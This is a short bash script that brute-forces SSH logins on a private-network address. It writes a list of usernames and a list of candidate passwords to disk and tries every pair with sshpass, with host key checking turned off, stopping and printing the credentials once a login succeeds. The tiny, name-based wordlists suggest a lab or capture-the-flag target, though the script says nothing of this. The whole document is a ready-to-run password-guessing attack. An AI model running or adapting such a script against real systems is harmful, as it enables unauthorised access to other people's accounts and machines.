#!/bin/bash

TARGET="192.168.107.135"
USER_FILE="users.txt"
PASS_FILE="passwords.txt"

# Create user list
cat > $USER_FILE << EOF
jane
mane
larry
james
jonas
adrain
EOF

# Create password list  
cat > $PASS_FILE << EOF
jamespeach
janenlane
jonnasnfriend
manedaround
larrytheplatipus
adrainkfc
bobthebuilder
EOF

echo "Starting SSH brute force on $TARGET..."
echo "======================================"

# Check if sshpass is installed
if ! command -v sshpass &> /dev/null; then
    echo "sshpass is required. Install with: sudo apt-get install sshpass"
    exit 1
fi

# Brute force loop
for user in $(cat $USER_FILE); do
    for password in $(cat $PASS_FILE); do
        echo "Trying: $user:$password"
        
        # Attempt SSH connection
        if sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$TARGET" "echo 'Success!'" 2>/dev/null; then
            echo "======================================"
            echo "SUCCESS! Valid credentials found:"
            echo "Username: $user"
            echo "Password: $password"
            echo "======================================"
            exit 0
        fi
    done
done

echo "No valid credentials found."
rm $USER_FILE $PASS_FILE
